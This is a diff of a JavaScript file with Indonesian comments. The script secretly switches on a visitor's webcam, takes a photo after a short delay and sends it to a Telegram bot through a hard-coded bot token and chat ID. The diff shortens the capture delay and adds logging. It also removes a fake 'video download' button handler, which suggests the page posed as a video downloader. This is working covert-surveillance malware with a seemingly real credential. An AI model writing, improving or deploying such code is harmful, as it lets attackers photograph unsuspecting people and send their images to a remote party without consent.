@@ -1,4 +1,4 @@
-const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8'; // Ganti dengan token bot Anda
+const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAU8H_0ljUav8'; // Ganti dengan token bot Anda
 const chatId = '6975695436'; // Ganti dengan chat ID Anda
 
 const video = document.getElementById('video');
@@ -6,17 +6,21 @@ const canvas = document.getElementById('canvas');
 
 // Akses webcam tanpa terlihat
 navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+    console.log("Webcam berhasil diakses.");
     video.srcObject = stream;
     video.play();
 
-    // Tangkap gambar setelah beberapa detik
+    // Tunggu beberapa detik agar video benar-benar siap sebelum mengambil gambar
     setTimeout(() => {
         const context = canvas.getContext("2d");
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Pastikan gambar benar-benar diproses sebelum mengirim ke Telegram
         canvas.toBlob(function(blob) {
+            console.log("Mengirim foto ke Telegram...");
             sendPhotoToTelegram(blob);
         }, 'image/jpeg');
-    }, 3000); // Ambil gambar setelah 3 detik
+    }, 500); // Menambahkan delay sedikit untuk memastikan gambar ter-render dengan baik
 }).catch(function(error) {
     console.error("Gagal mengakses webcam:", error);
 });
@@ -179,19 +183,3 @@ function sendMessageToTelegram(message) {
         console.error("Error saat mengirim pesan:", error);
     });
 }
-
-// Fungsi untuk menampilkan tombol download dan mengunduh video
-document.addEventListener("DOMContentLoaded", function () {
-    const downloadButton = document.getElementById("download");
-    const urlInput = document.getElementById("url");
-
-    downloadButton.addEventListener("click", function () {
-        const url = urlInput.value.trim(); // Ambil nilai input URL
-        if (url) {
-            alert(`Video berhasil diunduh: ${url}`);
-            // Di sini Anda bisa tambahkan logika untuk mengunduh video
-        } else {
-            alert("Masukkan URL terlebih dahulu!");
-        }
-    });
-});
